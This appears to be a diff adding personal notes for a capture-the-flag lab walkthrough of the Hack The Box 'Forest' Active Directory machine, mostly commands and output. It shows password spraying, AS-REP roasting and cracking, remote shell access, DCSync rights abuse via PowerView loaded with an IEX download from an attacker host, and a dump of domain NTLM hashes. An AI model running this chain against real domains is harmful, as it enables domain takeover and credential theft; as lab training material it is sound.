@@ -1,0 +1,820 @@
+FOREST: ACTIVE DIRECTORY MACHINE
+No Webserver, lots of chains, nuull sessiomns reproast, bloodhound, dcsync
+
+First we try to connect directly with smbclient:
+COMMAND:
+=============================================================================================
+smbclient -L 10.10.10.161 
+=============================================================================================
+OUTPUT:
+=============================================================================================
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+=============================================================================================
+
+We do an nslookup to do reverse lookups on itself. Could not leak hostname.
+COMMAND:
+=============================================================================================
+root@kali:~/htb/forest/nmap# nslookup
+> server 10.10.10.161
+Default server: 10.10.10.161
+Address: 10.10.10.161#53
+> 127.0.0.1
+1.0.0.127.in-addr.arpa	name = localhost.
+> 127.0.0.2
+** server can't find 2.0.0.127.in-addr.arpa: NXDOMAIN
+> 10.10.10.161
+;; connection timed out; no servers could be reached
+=============================================================================================
+
+Next we can take a look at ldap:
+COMMAND:
+=============================================================================================
+ldapsearch -h 10.10.10.161 -x -s base namingcontexts
+=============================================================================================
+OUTPUT:
+=============================================================================================
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingContexts: DC=htb,DC=local
+namingContexts: CN=Configuration,DC=htb,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
+namingContexts: DC=DomainDnsZones,DC=htb,DC=local
+namingContexts: DC=ForestDnsZones,DC=htb,DC=local
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+=============================================================================================
+
+We can now subsitute the base for the dc name: DC=htb,DC=local
+COMMAND:
+=============================================================================================
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local"  > ldap-anonymous.out
+=============================================================================================
+It is a lot of ldap information that we can query, we can look for a quuery with regards to people.
+Based on the saved file information we can find when the user last changed password or when account
+was created. etc.
+COMMAND:
+=============================================================================================
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName
+=============================================================================================
+
+The above command above is useful for gathering account names from. Useful for doing password sprays.
+sAMAccountName == username.
+COMMAND:
+==============================================================================================
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep -i samaccountname
+OR
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName | grep -i samaccountname
+==============================================================================================
+
+OUTPUT:
+==============================================================================================
+sAMAccountName: Guest
+sAMAccountName: DefaultAccount
+sAMAccountName: FOREST$
+sAMAccountName: EXCH01$
+sAMAccountName: $331000-VK4ADACQNUCA
+sAMAccountName: SM_2c8eef0a09b545acb
+sAMAccountName: SM_ca8c2ed5bdab4dc9b
+sAMAccountName: SM_75a538d3025e4db9a
+sAMAccountName: SM_681f53d4942840e18
+sAMAccountName: SM_1b41c9286325456bb
+sAMAccountName: SM_9b69f1b9d2cc45549
+sAMAccountName: SM_7c96b981967141ebb
+sAMAccountName: SM_c75ee099d0a64c91b
+sAMAccountName: SM_1ffab36a2f5f479cb
+sAMAccountName: HealthMailboxc3d7722
+sAMAccountName: HealthMailboxfc9daad
+sAMAccountName: HealthMailboxc0a90c9
+sAMAccountName: HealthMailbox670628e
+sAMAccountName: HealthMailbox968e74d
+sAMAccountName: HealthMailbox6ded678
+sAMAccountName: HealthMailbox83d6781
+sAMAccountName: HealthMailboxfd87238
+sAMAccountName: HealthMailboxb01ac64
+sAMAccountName: HealthMailbox7108a4e
+sAMAccountName: HealthMailbox0659cc1
+sAMAccountName: sebastien
+sAMAccountName: lucinda
+sAMAccountName: andy
+sAMAccountName: mark
+sAMAccountName: santi
+==============================================================================================
+Now we will do an account password spray.
+COMMAND:
+==============================================================================================
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep -i samaccountname | grep -v "#" | awk '{print $2}' > users.lst
+==============================================================================================
+
+We delete the guest account, the default account, and the accounts with '$' which are machine accounts, and we delete the Mailbox accounts as those were generated by exchange itself. We are left with
+5 accounts to try to get out foothold from.
+
+We now have to specify wordlist, We will now make our own password list. We create one that contiains
+the names of months, seasons, password permutation, with last year and this year appended.
+COMMAND:
+==============================================================================================
+for i in $(cat pass.lst); do echo $i; echo ${i}2019; echo ${i}2020; done > new-pass.lst
+### Lets add an exclamation mark after each instance
+for i in $(cat new-pass.lst); do echo $i; echo ${i}\! ; done > pass-list.txt
+==============================================================================================
+
+However this will not be enough so we will create a more robust list with hashcat which will mutate 
+our passwords and add different permutations.
+COMMAND:
+==============================================================================================
+hashcat --force --stdout pass-list.txt -r /usr/share/hashcat/rules/best64.rule
+##### We can actuually keep appending rules to make it a lot more granular however there maybe 
+##### repeats
+hashcat --force --stdout pass-list.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7' 
+
+hashcat --force --stdout pass-list.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7' > pwlist.txt
+==============================================================================================
+
+We most likely have 40000 potential password that will use to brute force which is a lot, one thing
+to lookout is to see if you get an account lockout so you would normally test it with one of the
+accounts that you have gathered info on.
+
+We can attempt to get the password policy by sing crackmapexec
+COMMAND:
+==============================================================================================
+cme smb 10.10.10.161 --pass-pol
+OR 
+cme smb 10.10.10.161 --pass-pol -u '' -p ''
+==============================================================================================
+OUTPUT:
+==============================================================================================
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
+SMB         10.10.10.161    445    FOREST           Minimum password length: 7
+SMB         10.10.10.161    445    FOREST           Password history length: 24
+SMB         10.10.10.161    445    FOREST           Maximum password age: 
+SMB         10.10.10.161    445    FOREST           
+SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
+SMB         10.10.10.161    445    FOREST           	Domain Refuse Password Change: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password Store Cleartext: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password Lockout Admins: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password No Clear Change: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password No Anon Change: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password Complex: 0
+SMB         10.10.10.161    445    FOREST           
+SMB         10.10.10.161    445    FOREST           Minimum password age: 
+SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes 
+SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes 
+SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
+SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
+SMB         10.10.10.161    445    FOREST           Minimum password length: 7
+SMB         10.10.10.161    445    FOREST           Password history length: 24
+SMB         10.10.10.161    445    FOREST           Maximum password age: 
+SMB         10.10.10.161    445    FOREST           
+SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
+SMB         10.10.10.161    445    FOREST           	Domain Refuse Password Change: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password Store Cleartext: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password Lockout Admins: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password No Clear Change: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password No Anon Change: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password Complex: 0
+SMB         10.10.10.161    445    FOREST           
+SMB         10.10.10.161    445    FOREST           Minimum password age: 
+SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes 
+SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes 
+SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
+SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set
+==============================================================================================
+
+If anonymous login is allowed put on report, null authentication allows domain enumeration and
+can get a lot of information regarding the domain. Also we could have attempted to a null session
+login with rpcclient as well and gained user information.
+COMMAND:
+==============================================================================================
+rpcclient -U '' 10.10.10.161 
+==============================================================================================
+OUTPUT:
+==============================================================================================
+Enter WORKGROUP\'s password: 
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+Enter WORKGROUP\'s password: 
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+==============================================================================================
+
+We actually end uup finding an extra accont by using rpcclient, the "svc-alfresco" user which we can 
+add to our list. we can gain more info by querying the user from rpc.
+COMMAND:
+==============================================================================================
+rpcclient $> queryuser svc-alfresco
+==============================================================================================
+
+OUTPUT:
+==============================================================================================
+	User Name   :	svc-alfresco
+	Full Name   :	svc-alfresco
+	Home Drive  :	
+	Dir Drive   :	
+	Profile Path:	
+	Logon Script:	
+	Description :	
+	Workstations:	
+	Comment     :	
+	Remote Dial :
+	Logon Time               :	Mon, 23 Sep 2019 07:09:48 EDT
+	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
+	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST
+	Password last set Time   :	Sun, 15 Nov 2020 19:43:33 EST
+	Password can change Time :	Mon, 16 Nov 2020 19:43:33 EST
+	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
+	unknown_2[0..31]...
+	user_rid :	0x47b
+	group_rid:	0x201
+	acb_info :	0x00010210
+	fields_present:	0x00ffffff
+	logon_divs:	168
+	bad_password_count:	0x00000000
+	logon_count:	0x00000006
+	padding1[0..7]...
+	logon_hrs[0..21]...
+==============================================================================================
+
+We can now take the rid of the user to query for the grops the user belongs to.
+COMMAND:
+==============================================================================================
+rpcclient $> queryusergroups 0x47b
+	group rid:[0x201] attr:[0x7]
+	group rid:[0x47c] attr:[0x7]
+rpcclient $> querygroup 0x201
+	Group Name:	Domain Users
+	Description:	All domain users
+	Group Attribute:7
+	Num Members:30S
+rpcclient $> querygroup 0x47c
+	Group Name:	Service Accounts
+	Description:	
+	Group Attribute:7
+	Num Members:1
+==============================================================================================
+
+This indeed helps with info gathering. Now we can try and bruteforce with our user and password
+list.
+COMMAND:
+==============================================================================================
+cme smb 10.10.10.161 -u users.lst -p pwlist.txt
+==============================================================================================
+OUTPUT:
+==============================================================================================
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019april2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019April2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019ApriL2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019AprIl2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.161    445    FOREST           [-] htb.local\sebastien:019ApRil2 STATUS_LOGON_FAILURE 
+...
+...
+...
+==============================================================================================
+
+
+Going back to the crackmap account threshold is set to 0 so we can safely brute force into things.
+We can now look at a list of impacket tools. One that will be useful is GetNPUsers for users that
+do not require kerberos preauthentication.
+COMMAND:
+==============================================================================================
+/opt/impacket-venv/bin/GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'
+==============================================================================================
+OUTPUT:
+==============================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2020-11-15 20:04:26.747911  2019-09-23 07:09:47.931194  0x410200 
+
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:e2233c2d2e54a1fb1b7f0e0d6621db45$e7ea3fcd41e69d3c190ac9992f6f28e038dc3bc35a6bc638b3a5a29bf43d066fc276e23c35dfe717abfc18d39de0634be51ed4d5e5bab785f42997c9f42d6f3c6b1a23b43bdb70c1b603daac3659dab36f558bd64caa2d2f66faaab38504ff3d7e89ec7e720c3a4fc82f1e83501ad3c0dc3a3f2fcaa05c9327ab188761496928e7ef90a81ce3766851ff625a8cb763a9d6c59370cd22ad0d4595fd5afd10c33419d4ca515924c9882eea6457220113cb4f25b0a2280b7817ca6912c552273a4e66d97be4226494e3481aa5f412f70433d3d9b17f2e3ebf2cdfbfbd5e6ca266fcac89d20324fb
+==============================================================================================
+
+We can also format it to hashcat. So we can attempt to crack it.
+COMMAND:
+==============================================================================================
+/opt/impacket-venv/bin/GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat
+==============================================================================================
+OUTPUT:
+==============================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2020-11-15 20:12:24.827009  2020-11-15 20:04:48.841694  0x410200 
+
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:6adaf806f64bba4f4cd9aa455c3bc047$a526d277d8e601f9ce5a6c41ce4635bdc56e04ed983fb13960c23ae611b71bbd1e6cfec96d9959d03f2908706c2affbe9bb0ff2cbfeb9ab321b226bef10b060d73e6e246683b9b3083f1e70086e12fa7abd7da5964a9f7b2bb55e5e46c4353db5f95e3d27e25d0ce41350a6fa68789d6a47e361206857e9e67b68733b4fe3aa8531db5a05c67379312a72f2d95af3c35bb4e97a1c740f210b03736bdd80311e69a3601d6ab974d41fab590556fdaff069265c2c56ee006c3fb24148e3d15e1248494cba3d11daf1210372669ca1c42c64c80feca7e98a83be86cded3b799ab3dd61e8216a863
+==============================================================================================
+
+
+----
+
+
+We can now attempt to crack the hash of the user we just found with hashcat
+COMMAND:
+==============================================================================================
+hashcat --force -m 18200 hashes/svc-alfresco /usr/share/wordlists/rockyou.txt
+==============================================================================================
+OUTPUT:
+==============================================================================================
+....
+....
+....
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:6adaf806f64bba4f4cd9aa455c3bc047$a526d277d8e601f9ce5a6c41ce4635bdc56e04ed983fb13960c23ae611b71bbd1e6cfec96d9959d03f2908706c2affbe9bb0ff2cbfeb9ab321b226bef10b060d73e6e246683b9b3083f1e70086e12fa7abd7da5964a9f7b2bb55e5e46c4353db5f95e3d27e25d0ce41350a6fa68789d6a47e361206857e9e67b68733b4fe3aa8531db5a05c67379312a72f2d95af3c35bb4e97a1c740f210b03736bdd80311e69a3601d6ab974d41fab590556fdaff069265c2c56ee006c3fb24148e3d15e1248494cba3d11daf1210372669ca1c42c64c80feca7e98a83be86cded3b799ab3dd61e8216a863:s3rvice
+==============================================================================================
+The users password is cracked with the user and password combo being the folowing: 
+svc-alfresco:s3rvice
+
+Now we can try and use crackmapexec with creds we just obtained:
+COMMAND:
+==============================================================================================
+cme smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
+==============================================================================================
+OUTPUT:
+==============================================================================================
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+==============================================================================================
+
+We can also list the shares with the following command:
+COMMAND:
+==============================================================================================
+root@kali:~/htb/forest# cme smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares
+==============================================================================================
+OUTPUT:
+==============================================================================================
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+SMB         10.10.10.161    445    FOREST           [+] Enumerated shares
+SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
+SMB         10.10.10.161    445    FOREST           -----           -----------     ------
+SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
+SMB         10.10.10.161    445    FOREST           C$                              Default share
+SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
+SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
+SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share 
+==============================================================================================
+
+We have access to IPC, SYSVOl, and netlogin. Look for impacket script that can get group policy 
+password. But in the meantime if we look at our nmap results we see that windows remote management
+port is up so we can try and remote in with evil winrm.
+
+COMMAND:
+==============================================================================================
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice' 
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /all
+==============================================================================================
+OUTPUT:
+==============================================================================================
+USER INFORMATION
+----------------
+
+User Name        SID
+================ =============================================
+htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
+HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+==============================================================================================
+
+
+Now that we have gained shell access we can try and use winpeas to gain more info and try and privesc
+We run winpeas
+COMMAND:
+==============================================================================================
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\winPEASx64.exe*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\winPEASx64.exe
+==============================================================================================
+OUTPUT:
+==============================================================================================
+....
+....
+....
+  [+] Drives Information
+   [?] Remember that you should search more info inside the other drives 
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 29 GB)(Permissions: Users [AppendData/CreateDirectories])
+    D:\ (Type: CDRom)
+....
+
+==============================================================================================
+It appears we have the ability to write to the c drive based on the output, we could potentially take
+advantage of unquoted service paths.
+
+We will now run bloodhound and see if we can get more info from the domain. You need to run neo4j
+if you want to run bloodhound. If you dont remember the bloodhound cred you can reeset it by 
+deleting the following file:
+COMMAND:
+==============================================================================================
+rm /usr/share/neo4j/data/dbms/auth
+==============================================================================================
+
+Make sure to pload sharphound.exe and run it from the remote shell, eventually you will get
+a zip file from which can download and use in conjunction with bloodhound.
+
+COMMAND:
+==============================================================================================
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\SharpHound.exe -c all
+==============================================================================================
+OUTPUT:
+==============================================================================================
+------------------------------------------------
+Initializing SharpHound at 7:28 PM on 11/15/2020
+------------------------------------------------
+
+Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
+
+[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
+[+] Cache File not Found: 0 Objects in cache
+
+[+] Pre-populating Domain Controller SIDS
+Status: 0 objects finished (+0) -- Using 21 MB RAM
+Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
+Enumeration finished in 00:00:02.4082780
+Compressing data to .\20201115192839_BloodHound.zip
+You can upload this file directly to the UI
+
+SharpHound Enumeration Completed at 7:28 PM on 11/15/2020! Happy Graphing!------------------------------------------------
+Initializing SharpHound at 7:28 PM on 11/15/2020
+------------------------------------------------
+
+Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
+
+[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
+[+] Cache File not Found: 0 Objects in cache
+
+[+] Pre-populating Domain Controller SIDS
+Status: 0 objects finished (+0) -- Using 21 MB RAM
+Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
+Enumeration finished in 00:00:02.4082780
+Compressing data to .\20201115192839_BloodHound.zip
+You can upload this file directly to the UI
+
+SharpHound Enumeration Completed at 7:28 PM on 11/15/2020! Happy Graphing!
+==============================================================================================
+
+Now that we look at the information in the graphs we mark the svc user as owned and look for the 
+shortest paths from kerborastable users. We see that we are members of the account operators group
+whihc means we have the ability to create users with limited privilges on the system so we will make
+a user keep track of things.
+
+We also need to add the new user to the "exchange_windows_permissions" group in our way to go
+from kerborasatble users to domain admins.
+
+COMMAND:
+==============================================================================================
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user jpow printmoney /add /domain
+The command completed successfully.
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" 
+Group name     Exchange Windows Permissions
+Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
+
+Members
+
+-------------------------------------------------------------------------------
+The command completed successfully.net group "Exchange Windows Permissions"
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add jpow
+The command completed successfully.
+==============================================================================================
+Now that are user has the proper permissons wee can abuse the group to try and obtain adminstrator.
+The following is an abuse info message for writedacl based on the group we added the new uuser to:
+INFO:
+==============================================================================================
+The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL.
+
+With write access to the target object's DACL, you can grant yourself any privilege you want on the object.
+==============================================================================================
+We will need powerview for the next steps to gain more privileges. We will be using the add domain
+object acl to give us the necessary permissions to use secretsdump.py by using the user that we 
+created with the modified permissions. the steps are as follows.
+
+COMMAND:
+==============================================================================================
+$pass = convertto-securestring 'printingmoney' -AsPlainText -Force 
+$cred = New-Object System.Management.Automation.PSCredential('HTB\jpow', $pass)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity jpow -Rights DCSync
+
+IEX(New-Object Net.WebClient).donwloadString('http://10.10.14.3/PowerView.ps1')
+
+####### FOLLOWING COMMANDS WORKED #####
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 's3rvice' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
+edential('htb\svc-alfresco', $pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
+####### HAD TO RUN COMMAND TWICE ALONGSIDE SECRETSDUMP.PY ###########
+==============================================================================================
+
+Had troubles running commands but was able to load powerview into memory to access the add domain
+function, had to svc-alfresco user since the newly creeated user 'jpow' was not working.
+COMMAND:
+==============================================================================================
+root@kali:~/htb/forest/smb# /opt/impacket-venv/bin/secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
+==============================================================================================
+OUTPUT:
+==============================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
